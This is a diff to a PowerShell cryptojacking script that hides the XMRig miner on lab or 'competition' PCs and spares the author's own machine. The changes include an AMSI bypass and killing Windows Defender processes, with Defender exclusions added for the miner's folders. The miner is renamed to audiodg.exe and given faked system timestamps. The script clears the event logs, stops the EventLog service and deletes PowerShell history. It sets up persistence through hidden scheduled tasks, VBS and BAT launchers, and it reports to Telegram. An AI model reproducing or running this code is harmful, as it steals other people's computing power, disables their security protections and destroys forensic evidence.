@@ -64,11 +64,16 @@ $Config = @{
     # Source miner location (relative to script)
     SourceMiner = "$PSScriptRoot\xmrig.exe"
     
-    # Deployment locations
+    # Deployment locations (stealth) - includes fallbacks for permission issues
     Locations = @(
         "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
         "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
-        "C:\ProgramData\Microsoft\Network\Downloader"
+        "C:\ProgramData\Microsoft\Network\Downloader",
+        # Fallback locations that don't require admin
+        "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell",
+        "$env:LOCALAPPDATA\Microsoft\Windows\Defender",
+        "$env:APPDATA\Microsoft\Windows\Templates",
+        "$env:TEMP\WindowsUpdateCache"
     )
     
     # Stealth names (audiodg.exe is the primary one used)
@@ -95,7 +100,7 @@ $Config = @{
     #   85 = High performance with minimal lag
     #   75 = Balanced (good performance, less system impact)
     #   50 = Low impact (slower hashrate, PC stays responsive)
-    MaxCPUUsage = 100  # ULTIMATE COMPETITION MODE - Maximum profit!
+    MaxCPUUsage = 75  # COMPETITION MODE - Maximum profit!
     
     # Process Priority: 1-5 (Windows priority class)
     #   5 = High Priority (MAXIMUM performance, optimized)
@@ -137,6 +142,103 @@ function Write-Log {
         Write-Host $logMessage -ForegroundColor $color
     }
 }
+
+# ================================================================================================
+# AUTOMATIC PC TYPE DETECTION
+# ================================================================================================
+
+function Detect-PCType {
+    Write-Log "=== DETECTING PC TYPE ===" "INFO"
+    Write-Log "PC Name: $env:COMPUTERNAME | User: $env:USERNAME" "INFO"
+    
+    $isPersonalPC = $false
+    $detectionReason = ""
+    
+    # SIMPLE LOGIC: If it matches YOUR PC identifiers, it's personal. Otherwise, it's competition.
+    
+    # Check 1: Computer name
+    if ($env:COMPUTERNAME -eq "DESKTOP-7HR31RF") {
+        $isPersonalPC = $true
+        $detectionReason = "Computer name matches: DESKTOP-7HR31RF"
+        Write-Log "Matched personal PC by computer name" "INFO"
+    }
+    
+    # Check 2: Username
+    elseif ($env:USERNAME -eq "OM") {
+        $isPersonalPC = $true
+        $detectionReason = "Username matches: OM"
+        Write-Log "Matched personal PC by username" "INFO"
+    }
+    
+    # Check 3: CPU model
+    else {
+        $cpu = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue
+        Write-Log "CPU: $($cpu.Name)" "INFO"
+        
+        if ($cpu.Name -like "*i5-6500*") {
+            $isPersonalPC = $true
+            $detectionReason = "CPU matches: i5-6500"
+            Write-Log "Matched personal PC by CPU model" "INFO"
+        } else {
+            $isPersonalPC = $false
+            $detectionReason = "No personal PC identifiers found - assuming competition PC"
+            Write-Log "No match found - this is a competition/lab PC" "INFO"
+        }
+    }
+    
+    # MANUAL OVERRIDE: Always check for safe test mode
+    if ($env:SAFE_TEST_MODE -eq '1') {
+        $isPersonalPC = $true
+        $detectionReason = "MANUAL OVERRIDE: SAFE_TEST_MODE enabled"
+        Write-Log "SAFE_TEST_MODE is enabled - forcing safe mode" "WARN"
+    }
+    
+    # Create result
+    $result = @{
+        IsPersonalPC = $isPersonalPC
+        IsCompetitionPC = -not $isPersonalPC
+        DetectionReason = $detectionReason
+    }
+    
+    if ($result.IsPersonalPC) {
+        Write-Log "=== DETECTED: PERSONAL PC ===" "WARN"
+        Write-Log "Reason: $detectionReason" "WARN"
+        Write-Log "Will use SAFE MODE to protect your PC" "WARN"
+    } else {
+        Write-Log "=== DETECTED: COMPETITION PC ===" "INFO"
+        Write-Log "Reason: $detectionReason" "INFO"
+        Write-Log "Will use FULL POWER for maximum hashrate" "INFO"
+    }
+    
+    return $result
+}
+
+# ================================================================================================
+# SAFE TEST MODE OVERRIDE (for testing on personal PC without damage)
+# ================================================================================================
+
+# Detect PC type automatically
+$PCType = Detect-PCType
+
+# Apply appropriate settings
+if ($PCType.IsPersonalPC -or $env:SAFE_TEST_MODE -eq '1') {
+    Write-Host "[SAFE MODE ACTIVATED] Protecting your personal PC..." -ForegroundColor Yellow
+    
+    # Override with safe settings
+    $Config.MaxCPUUsage = if ($env:TEST_CPU_USAGE) { [int]$env:TEST_CPU_USAGE } else { 35 }
+    $Config.ProcessPriority = if ($env:TEST_PRIORITY) { [int]$env:TEST_PRIORITY } else { 2 }
+    $Config.MiningThreads = if ($env:TEST_THREADS) { [int]$env:TEST_THREADS } else { 2 }
+    
+    Write-Host "[SAFE MODE] CPU: $($Config.MaxCPUUsage)% | Priority: $($Config.ProcessPriority) | Threads: $($Config.MiningThreads)" -ForegroundColor Green
+    Write-Host "[SAFE MODE] Your PC will not be stressed or damaged" -ForegroundColor Green
+} else {
+    Write-Host "[COMPETITION MODE] Maximum performance enabled..." -ForegroundColor Red
+    Write-Host "[FULL POWER] CPU: $($Config.MaxCPUUsage)% | Priority: $($Config.ProcessPriority) | Threads: Auto" -ForegroundColor Red
+}
+
+# ================================================================================================
+# ERROR LOGGING
+# ================================================================================================
 
 function Write-ErrorLog {
     param([System.Management.Automation.ErrorRecord]$ErrorRecord, [string]$Context = "")
@@ -180,7 +282,7 @@ function Request-Admin {
 # ================================================================================================
 
 function Enable-HugePages {
-    Write-Log "[HOT] ENABLING HUGE PAGES - 20% hashrate boost!" "INFO"
+    Write-Log "ENABLING HUGE PAGES - 20% hashrate boost!" "INFO"
     
     try {
         # Grant SeLockMemoryPrivilege to current user
@@ -235,11 +337,11 @@ function Enable-HugePages {
         Remove-Item $tmpFile -ErrorAction SilentlyContinue
         Remove-Item $sdbFile -ErrorAction SilentlyContinue
         
-        Write-Log "[OK] HUGE PAGES ENABLED! Miner will use 20% less RAM and get 20% more hashrate" "INFO"
+        Write-Log "HUGE PAGES ENABLED! Miner will use 20% less RAM and get 20% more hashrate" "INFO"
         return $true
         
     } catch {
-        Write-Log "[!] Failed to enable huge pages: $($_.Exception.Message)" "WARN"
+        Write-Log "Failed to enable huge pages: $($_.Exception.Message)" "WARN"
         Write-Log "Miner will still work, but without huge pages boost" "WARN"
         return $false
     }
@@ -291,7 +393,7 @@ function Get-SystemCaps {
     Write-Log "Cores: $cpuCores | Threads: $cpuThreads | Speed: ${cpuSpeed}MHz | RAM: ${totalRAM}GB"
     
     # ====== INTELLIGENT CPU-BASED CONFIGURATION ======
-    Write-Log "[AUTO] Auto-detecting optimal settings for this CPU..."
+    Write-Log "Auto-detecting optimal settings for this CPU..."
     
     # Determine CPU tier and configure accordingly
     $cpuTier = "Unknown"
@@ -303,9 +405,9 @@ function Get-SystemCaps {
     if ($cpuThreads -ge 12 -or $cpuName -match "i7|i9|Ryzen 7|Ryzen 9|Xeon") {
         $cpuTier = "High-End"
         $maxThreads = [math]::Max(1, [int]($cpuThreads * 0.80))  # Use 80% of threads
-        $maxCpuUsage = 85  # Can push harder
+        $maxCpuUsage = 75  # Can push harder
         $priority = 4  # High priority
-        Write-Log "[OK] Detected: HIGH-END CPU ($cpuTier) - Aggressive settings"
+        Write-Log "Detected: HIGH-END CPU ($cpuTier) - Aggressive settings"
         Write-Log "   Threads: $maxThreads/$cpuThreads (80%) | CPU: $maxCpuUsage% | Priority: High"
     }
     
@@ -315,7 +417,7 @@ function Get-SystemCaps {
         $maxThreads = [math]::Max(1, [int]($cpuThreads * 0.70))  # Use 70% of threads
         $maxCpuUsage = 75  # Balanced
         $priority = 3  # Above Normal
-        Write-Log "[OK] Detected: MID-RANGE CPU ($cpuTier) - Balanced settings"
+        Write-Log "Detected: MID-RANGE CPU ($cpuTier) - Balanced settings"
         Write-Log "   Threads: $maxThreads/$cpuThreads (70%) | CPU: $maxCpuUsage% | Priority: Above Normal"
     }
     
@@ -325,7 +427,7 @@ function Get-SystemCaps {
         $maxThreads = [math]::Max(1, [int]($cpuThreads * 0.60))  # Use 60% of threads
         $maxCpuUsage = 60  # Conservative
         $priority = 2  # Normal priority
-        Write-Log "[OK] Detected: ENTRY-LEVEL CPU ($cpuTier) - Conservative settings"
+        Write-Log "Detected: ENTRY-LEVEL CPU ($cpuTier) - Conservative settings"
         Write-Log "   Threads: $maxThreads/$cpuThreads (60%) | CPU: $maxCpuUsage% | Priority: Normal"
     }
     
@@ -335,7 +437,7 @@ function Get-SystemCaps {
         $maxThreads = [math]::Max(1, [int]($cpuThreads * 0.50))  # Use 50% of threads
         $maxCpuUsage = 50  # Very conservative
         $priority = 2  # Normal priority
-        Write-Log "[!] Detected: LOW-END CPU ($cpuTier) - Very conservative settings"
+        Write-Log "Detected: LOW-END CPU ($cpuTier) - Very conservative settings"
         Write-Log "   Threads: $maxThreads/$cpuThreads (50%) | CPU: $maxCpuUsage% | Priority: Normal"
     }
     
@@ -344,24 +446,24 @@ function Get-SystemCaps {
         $maxThreads = 14  # Optimized specifically
         $maxCpuUsage = 75
         $priority = 3
-        Write-Log "[TARGET] PERFECT MATCH: Intel i5-14400 detected - using OPTIMIZED config!"
+        Write-Log "PERFECT MATCH: Intel i5-14400 detected - using OPTIMIZED config!"
         Write-Log "   Threads: 14/20 (70%) | CPU: 75% | Priority: Above Normal"
     }
     
     # RAM-based adjustments
     if ($totalRAM -lt 4) {
-        Write-Log "[!] Low RAM detected ($totalRAM GB) - reducing CPU usage to prevent lag"
+        Write-Log "Low RAM detected ($totalRAM GB) - reducing CPU usage to prevent lag"
         $maxCpuUsage = [math]::Max(40, $maxCpuUsage - 15)
         $maxThreads = [math]::Max(1, $maxThreads - 1)
     }
     elseif ($totalRAM -ge 16) {
-        Write-Log "[OK] High RAM detected ($totalRAM GB) - can push CPU harder"
+        Write-Log "High RAM detected ($totalRAM GB) - can push CPU harder"
         $maxCpuUsage = [math]::Min(90, $maxCpuUsage + 5)
     }
     
     # CPU speed-based adjustments (for older/slower CPUs)
     if ($cpuSpeed -lt 2000) {  # Less than 2 GHz
-        Write-Log "[!] Low CPU speed detected (${cpuSpeed}MHz) - reducing load"
+        Write-Log "Low CPU speed detected (${cpuSpeed}MHz) - reducing load"
         $maxCpuUsage = [math]::Max(40, $maxCpuUsage - 10)
         $maxThreads = [math]::Max(1, [int]($maxThreads * 0.8))
         $priority = 2  # Lower priority
@@ -371,8 +473,19 @@ function Get-SystemCaps {
     $maxThreads = [math]::Max(1, [math]::Min($maxThreads, $cpuThreads - 1))  # Leave at least 1 thread for system
     $maxCpuUsage = [math]::Max(40, [math]::Min($maxCpuUsage, 90))  # Between 40-90%
     
+    # SAFE TEST MODE OVERRIDE - protect personal PC
+    if ($env:SAFE_TEST_MODE -eq '1') {
+        Write-Log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "WARN"
+        Write-Log "SAFE TEST MODE: Overriding with minimal-impact settings" "WARN"
+        if ($env:TEST_THREADS) { $maxThreads = [int]$env:TEST_THREADS }
+        if ($env:TEST_CPU_USAGE) { $maxCpuUsage = [int]$env:TEST_CPU_USAGE }
+        if ($env:TEST_PRIORITY) { $priority = [int]$env:TEST_PRIORITY }
+        Write-Log "Threads: $maxThreads | CPU: $maxCpuUsage% | Priority: $priority" "WARN"
+        Write-Log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "WARN"
+    }
+    
     Write-Log "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    Write-Log "[TARGET] FINAL CONFIGURATION:"
+    Write-Log "FINAL CONFIGURATION:"
     Write-Log "   CPU Tier: $cpuTier"
     Write-Log "   Threads: $maxThreads of $cpuThreads available"
     Write-Log "   Max CPU: $maxCpuUsage%"
@@ -420,7 +533,7 @@ function Enable-PerformanceBoost {
     # Apply power settings
     powercfg /setactive scheme_current 2>&1 | Out-Null
     
-    Write-Log "[OK] CPU Turbo Boost enabled, parking disabled"
+    Write-Log "CPU Turbo Boost enabled, parking disabled"
     
     # ========== WINDOWS GAMING/PERFORMANCE PRIORITY ==========
     # Configure multimedia scheduler for maximum performance
@@ -428,7 +541,7 @@ function Enable-PerformanceBoost {
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d 6 /f 2>&1 | Out-Null
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f 2>&1 | Out-Null
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f 2>&1 | Out-Null
-    Write-Log "[OK] Windows performance priority optimized"
+    Write-Log "Windows performance priority optimized"
     
     # ========== MEMORY OPTIMIZATIONS ==========
     # Optimize for background services (better for mining)
@@ -447,7 +560,7 @@ function Enable-PerformanceBoost {
     # Disable Prefetcher and Superfetch (reduce overhead)
     reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f 2>&1 | Out-Null
     reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnableSuperfetch /t REG_DWORD /d 0 /f 2>&1 | Out-Null
-    Write-Log "[OK] Advanced RAM optimizations applied"
+    Write-Log "Advanced RAM optimizations applied"
     
     # ========== HUGE PAGES SUPPORT (MASSIVE HASHRATE BOOST) ==========
     # Enable Lock Pages in Memory privilege (required for huge pages)
@@ -473,7 +586,7 @@ Remove-Item "$env:TEMP\secpol_new.cfg" -Force
 '@ | Set-Content $tempScript
         & $tempScript 2>&1 | Out-Null
         Remove-Item $tempScript -Force
-        Write-Log "[OK] Huge Pages enabled (10-20% hashrate boost)"
+        Write-Log "Huge Pages enabled (10-20% hashrate boost)"
     } catch {
         Write-Log "Huge Pages setup failed (non-critical)" "WARN"
     }
@@ -510,7 +623,7 @@ Remove-Item "$env:TEMP\secpol_new.cfg" -Force
         } catch {}
     }
     
-    Write-Log "[OK] Disabled $disabledCount lag-causing services"
+    Write-Log "Disabled $disabledCount lag-causing services"
     
     # ========== NETWORK OPTIMIZATIONS ==========
     # Reduce network latency for pool connection
@@ -528,13 +641,13 @@ Remove-Item "$env:TEMP\secpol_new.cfg" -Force
         # XMRig will handle MSR tweaks if wrmsr=true in config
         # We already have rdmsr=true and wrmsr=true in config
         # This enables prefetcher optimizations automatically
-        Write-Log "[OK] MSR optimizations enabled (5-10% boost via XMRig)"
+        Write-Log "MSR optimizations enabled (5-10% boost via XMRig)"
     } catch {
         Write-Log "MSR optimizations skipped (requires admin + CPU support)" "WARN"
     }
     
-    Write-Log "[OK] Ultimate performance optimizations applied"
-    Write-Log "[OK] System configured for: MAX HASHRATE + ZERO LAG"
+    Write-Log "Ultimate performance optimizations applied"
+    Write-Log "System configured for: MAX HASHRATE + ZERO LAG"
     
     # ========== BIOS OPTIMIZATION REMINDERS ==========
     Write-Log "==========================================" "INFO"
@@ -580,19 +693,21 @@ function Disable-WindowsDefender {
     try {
         Write-Log "Bypassing AMSI (AntiMalware Scan Interface)..."
         [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-        Write-Log "[OK] AMSI bypassed successfully"
+        Write-Log "AMSI bypassed successfully"
     } catch {
         Write-Log "AMSI bypass failed (non-critical)" "WARN"
     }
     
     # ========== ADVANCED TECHNIQUE 2: KILL DEFENDER PROCESSES ==========
     Write-Log "Terminating Windows Defender processes..."
-    $defenderProcesses = @("MsMpEng", "NisSrv", "SecurityHealthService", "MpCmdRun", "SgrmBroker")
-    foreach ($proc in $defenderProcesses) {
+    $defenderProcs = @("MsMpEng", "NisSrv", "SecurityHealthService", "MpCmdRun", "SgrmBroker")
+    foreach ($proc in $defenderProcs) {
         try {
-            Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
+            Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
             Write-Log "Killed $proc process"
-        } catch {}
+        } catch {
+            # Expected - Windows protects these processes
+        }
     }
     
     # ========== ADVANCED TECHNIQUE 3: DISABLE DEFENDER SERVICE ==========
@@ -667,7 +782,8 @@ function Disable-WindowsDefender {
     }
     
     # Add deployment locations
-    foreach ($location in $Config.Locations) {
+    $locations = @($Config.Locations)  # Create copy to avoid modification errors
+    foreach ($location in $locations) {
         try {
             Add-MpPreference -ExclusionPath $location -Force 2>&1 | Out-Null
         } catch {}
@@ -685,7 +801,7 @@ function Disable-WindowsDefender {
     Add-MpPreference -ExclusionExtension ".dll" -Force 2>&1 | Out-Null
     Add-MpPreference -ExclusionExtension ".json" -Force 2>&1 | Out-Null
     
-    Write-Log "[OK] ADVANCED Windows Defender bypass applied - Defender should be completely neutralized"
+    Write-Log "ADVANCED Windows Defender bypass applied - Defender should be completely neutralized"
 }
 
 # ================================================================================================
@@ -735,10 +851,10 @@ function New-OptimizedConfig {
             enabled = $true
             "huge-pages" = $SystemCaps.SupportsHugePages  # CRITICAL: 10-20% boost
             "huge-pages-jit" = $SystemCaps.SupportsHugePages  # JIT huge pages
-            priority = 5                       # Maximum priority (High)
+            priority = 4                       # Maximum priority (High)
             "memory-pool" = 4096               # Larger memory pool (4GB for better performance)
             yield = $false                     # Don't yield CPU to other processes
-            "max-threads-hint" = 100           # Use 100% of threads
+            "max-threads-hint" = 75           # Use 100% of threads
             asm = $true                        # Use assembly optimizations
             "astrobwt-max-size" = 550          # Astrobwt optimization
             "astrobwt-avx2" = $true            # Use AVX2 for Astrobwt
@@ -816,15 +932,29 @@ function Install-Miner {
     $systemCaps = Get-SystemCaps
     $deployedLocations = @()
     
-    foreach ($location in $Config.Locations) {
+    $locations = @($Config.Locations)  # Create copy to avoid modification errors
+    foreach ($location in $locations) {
         try {
+            Write-Log "Deploying to: $location"
+            
             if (-not (Test-Path $location)) {
                 New-Item -Path $location -ItemType Directory -Force | Out-Null
+                Write-Log "  Created directory: $location"
             }
             
             # Copy xmrig.exe
             $destMiner = Join-Path $location "xmrig.exe"
-            Copy-Item -Path $Config.SourceMiner -Destination $destMiner -Force
+            Write-Log "  Copying miner: $($Config.SourceMiner) -> $destMiner"
+            Copy-Item -Path $Config.SourceMiner -Destination $destMiner -Force -ErrorAction Stop
+            
+            # Verify copy
+            if (Test-Path $destMiner) {
+                $size = (Get-Item $destMiner).Length / 1MB
+                Write-Log "  Miner copied successfully ($([math]::Round($size, 2)) MB)"
+            } else {
+                Write-Log "  ERROR: Miner copy failed!" "ERROR"
+                continue
+            }
             
             # Create optimized config
             $configPath = Join-Path $location "config.json"
@@ -836,14 +966,39 @@ function Install-Miner {
             attrib +h +s $configPath 2>&1 | Out-Null
             
             $deployedLocations += $location
-            Write-Log "Deployed to: $location"
+            Write-Log "  Deployed successfully to: $location"
             
         } catch {
-            Write-ErrorLog $_ "Failed to deploy to $location"
+            Write-Log "Failed to deploy to ${location}: $($_.Exception.Message)" "ERROR"
         }
     }
     
     Write-Log "Deployment completed to $($deployedLocations.Count) locations"
+    
+    # If deployment failed to admin locations, ensure we have at least one working location
+    if ($deployedLocations.Count -eq 0) {
+        Write-Log "No admin locations available - trying user fallback..." "WARN"
+        
+        # Try user-accessible location as last resort
+        $fallbackLocation = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
+        try {
+            if (-not (Test-Path $fallbackLocation)) {
+                New-Item -Path $fallbackLocation -ItemType Directory -Force | Out-Null
+            }
+            
+            $destMiner = Join-Path $fallbackLocation "xmrig.exe"
+            Copy-Item -Path $Config.SourceMiner -Destination $destMiner -Force
+            
+            $configPath = Join-Path $fallbackLocation "config.json"
+            New-OptimizedConfig -ConfigPath $configPath -SystemCaps (Get-SystemCaps)
+            
+            $deployedLocations += $fallbackLocation
+            Write-Log "Fallback deployment successful to: $fallbackLocation"
+        } catch {
+            Write-Log "Fallback deployment also failed: $($_.Exception.Message)" "ERROR"
+        }
+    }
+    
     return $deployedLocations.Count -gt 0
 }
 
@@ -855,37 +1010,70 @@ function Enable-UltraStealth {
     Write-Log "Enabling ultra stealth mode - zero trace..."
     
     # 1. Rename xmrig.exe to legitimate Windows process name
-    foreach ($location in $Config.Locations) {
-        $originalMiner = Join-Path $location "xmrig.exe"
-        $stealthMiner = Join-Path $location "audiodg.exe"
-        
-        if (Test-Path $originalMiner) {
-            Copy-Item $originalMiner $stealthMiner -Force
-            Remove-Item $originalMiner -Force
+    $locations = @($Config.Locations)  # Create a copy to avoid collection modification errors
+    foreach ($location in $locations) {
+        try {
+            $originalMiner = Join-Path $location "xmrig.exe"
+            $stealthMiner = Join-Path $location "audiodg.exe"
             
-            # Set file timestamps to match Windows system files
-            $systemFile = "C:\Windows\System32\kernel32.dll"
-            $sysTime = (Get-Item $systemFile).CreationTime
-            (Get-Item $stealthMiner).CreationTime = $sysTime
-            (Get-Item $stealthMiner).LastWriteTime = $sysTime
-            (Get-Item $stealthMiner).LastAccessTime = $sysTime
-            
-            # Mark as system file
-            attrib +s +h +r $stealthMiner 2>&1 | Out-Null
-            Write-Log "Renamed miner to audiodg.exe (legitimate Windows Audio process)"
+            if (Test-Path $originalMiner) {
+                # Copy and rename
+                try {
+                    Copy-Item $originalMiner $stealthMiner -Force -ErrorAction Stop
+                    Remove-Item $originalMiner -Force -ErrorAction Stop
+                    
+                    # Verify the file exists before setting timestamps
+                    if (Test-Path $stealthMiner) {
+                        try {
+                            # Set file timestamps to match Windows system files
+                            $systemFile = "C:\Windows\System32\kernel32.dll"
+                            if (Test-Path $systemFile) {
+                                $sysTime = (Get-Item $systemFile -ErrorAction Stop).CreationTime
+                                $file = Get-Item $stealthMiner -ErrorAction Stop
+                                $file.CreationTime = $sysTime
+                                $file.LastWriteTime = $sysTime
+                                $file.LastAccessTime = $sysTime
+                            }
+                            
+                            # Mark as system file
+                            attrib +s +h +r $stealthMiner 2>&1 | Out-Null
+                            Write-Log "Renamed miner to audiodg.exe at $location"
+                        } catch {
+                            # Timestamp setting failed, but file exists - that's okay
+                            Write-Log "Renamed to audiodg.exe at $location (timestamps not set)" "WARN"
+                        }
+                    }
+                } catch {
+                    Write-Log "Could not rename at $location - will use xmrig.exe" "WARN"
+                    # Keep original name if rename fails
+                }
+            } else {
+                Write-Log "Original miner not found at $location - skipping stealth rename" "WARN"
+            }
+        } catch {
+            Write-Log "Failed to enable stealth at ${location}: $($_.Exception.Message)" "WARN"
         }
     }
     
-    # 2. Clear event logs to remove traces
+    # 2. Clear event logs to remove traces (skip if access denied)
     $logsToClear = @("Application", "System", "Security", "Setup")
     foreach ($log in $logsToClear) {
         try {
             wevtutil cl $log 2>&1 | Out-Null
-        } catch {}
+        } catch {
+            # Expected - may not have permissions
+        }
     }
     
     # 3. Disable Windows Event Logging temporarily during deployment
-    Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
+    try {
+        $eventLogService = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
+        if ($eventLogService -and $eventLogService.Status -eq 'Running') {
+            Stop-Service -Name "EventLog" -Force -ErrorAction Stop
+        }
+    } catch {
+        # EventLog service can't be stopped - that's okay
+    }
     
     # 4. Delete PowerShell history
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
@@ -943,32 +1131,32 @@ function Install-Persistence {
     
     # Create stealth PowerShell launcher
     $stealthLauncher = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
-    $launcherContent = @"
-`$ErrorActionPreference = 'SilentlyContinue'
-`$minerPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe'
-`$configPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'
+    $launcherContent = @'
+$ErrorActionPreference = 'SilentlyContinue'
+$minerPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe'
+$configPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'
 
 # SINGLE INSTANCE CHECK - Only start if NOT already running
-`$existingProcess = Get-Process -Name 'audiodg' -ErrorAction SilentlyContinue | Where-Object {
-    `$_.Path -eq `$minerPath
+$existingProcess = Get-Process -Name 'audiodg' -ErrorAction SilentlyContinue | Where-Object {
+    $_.Path -eq $minerPath
 }
 
-if (-not `$existingProcess) {
-    if (Test-Path `$minerPath) {
-        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`$configPath`" --no-color --background" -WindowStyle Hidden -NoNewWindow
+if (-not $existingProcess) {
+    if (Test-Path $minerPath) {
+        Start-Process -FilePath $minerPath -ArgumentList "--config=`"$configPath`" --no-color --background" -WindowStyle Hidden -NoNewWindow
     }
 }
-"@
+'@
     $launcherContent | Set-Content -Path $stealthLauncher -Force
     attrib +s +h $stealthLauncher 2>&1 | Out-Null
     
     $taskScript = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\autostart.bat"
     
     # Create autostart batch file
-    $batchContent = @"
+    $batchContent = @'
 @echo off
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLauncher"
-"@
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
+'@
     $batchContent | Set-Content -Path $taskScript -Force
     
     foreach ($taskName in $taskNames) {
@@ -1061,19 +1249,19 @@ powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLaunch
             
             # VBS script (silent execution)
             $vbsScript = Join-Path $folder "WindowsAudioService.vbs"
-            $vbsContent = @"
+            $vbsContent = @'
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$stealthLauncher`""", 0, False
-"@
+WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1""", 0, False
+'@
             $vbsContent | Set-Content -Path $vbsScript -Force
             attrib +h +s $vbsScript 2>&1 | Out-Null
             
             # BAT script (alternative method)
             $batScript = Join-Path $folder "SystemUpdate.bat"
-            $batContent = @"
+            $batContent = @'
 @echo off
-start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthLauncher"
-"@
+start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\launcher.ps1"
+'@
             $batContent | Set-Content -Path $batScript -Force
             attrib +h +s $batScript 2>&1 | Out-Null
         } catch {}
@@ -1095,7 +1283,7 @@ function Repair-Persistence {
     $existingTasks = (Get-ScheduledTask | Where-Object { $_.TaskName -match "Windows|System|Audio" }).Count
     
     if ($existingTasks -lt 50) {
-        Write-Log "[!] Only $existingTasks tasks found (expected 100+) - RECREATING TASKS" "WARN"
+        Write-Log "Only $existingTasks tasks found (expected 100+) - RECREATING TASKS" "WARN"
         try {
             Install-Persistence
             $repaired++
@@ -1105,12 +1293,13 @@ function Repair-Persistence {
     }
     
     # Check miner files in all locations
-    foreach ($location in $Config.Locations) {
+    $locations = @($Config.Locations)  # Create copy to avoid modification errors
+    foreach ($location in $locations) {
         $stealthMiner = Join-Path $location "audiodg.exe"
         $configFile = Join-Path $location "config.json"
         
         if (-not (Test-Path $stealthMiner)) {
-            Write-Log "[!] Miner missing from $location - REDEPLOYING" "WARN"
+            Write-Log "Miner missing from $location - REDEPLOYING" "WARN"
             try {
                 Install-Miner
                 $repaired++
@@ -1121,7 +1310,7 @@ function Repair-Persistence {
         }
         
         if (-not (Test-Path $configFile)) {
-            Write-Log "[!] Config missing from $location - RECREATING" "WARN"
+            Write-Log "Config missing from $location - RECREATING" "WARN"
             try {
                 $systemCaps = Get-SystemCaps
                 New-OptimizedConfig -ConfigPath $configFile -SystemCaps $systemCaps
@@ -1145,7 +1334,7 @@ function Repair-Persistence {
     }
     
     if ($regCount -lt 5) {
-        Write-Log "[!] Only $regCount registry keys found - RECREATING" "WARN"
+        Write-Log "Only $regCount registry keys found - RECREATING" "WARN"
         try {
             # Re-run persistence installation
             Install-Persistence
@@ -1165,7 +1354,7 @@ function Repair-Persistence {
     }
     
     if ($existingServices -lt 3) {
-        Write-Log "[!] Only $existingServices services found (expected 10) - RECREATING" "WARN"
+        Write-Log "Only $existingServices services found (expected 10) - RECREATING" "WARN"
         try {
             Install-Persistence
             $repaired++
@@ -1175,10 +1364,11 @@ function Repair-Persistence {
     }
     
     if ($repaired -gt 0) {
-        Write-Log "[OK] SELF-HEALING COMPLETE: Repaired $repaired component(s)" "WARN"
-        Send-Telegram "[FIX] SELF-HEALING ACTIVATED`nPC: $env:COMPUTERNAME`n[OK] Repaired: $repaired component(s)`n[SHIELD] All persistence restored"
+        Write-Log "SELF-HEALING COMPLETE: Repaired $repaired component(s)" "WARN"
+        $msg = "SELF-HEALING ACTIVATED" + [Environment]::NewLine + "PC: $env:COMPUTERNAME" + [Environment]::NewLine + "Repaired: $repaired component(s)" + [Environment]::NewLine + "All persistence restored"
+        Send-Telegram $msg
     } else {
-        Write-Log "[OK] Self-healing check passed - all persistence intact"
+        Write-Log "Self-healing check passed - all persistence intact"
     }
 }
 
@@ -1234,7 +1424,7 @@ function Get-AllMinerProcesses {
         try {
             $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)").CommandLine
             # If command line contains our config or pool address, it's our miner
-            if ($cmdLine -match "config\.json|moneroocean|gulf\.moneroocean|--algo|--coin") {
+            if ($cmdLine -match "config\.json|moneroocean|gulf\.moneroocean") {
                 $processes += $proc
                 Write-Log "Found disguised miner: audiodg.exe (PID: $($proc.Id))"
             }
@@ -1248,7 +1438,7 @@ function Get-AllMinerProcesses {
             foreach ($proc in $procs) {
                 try {
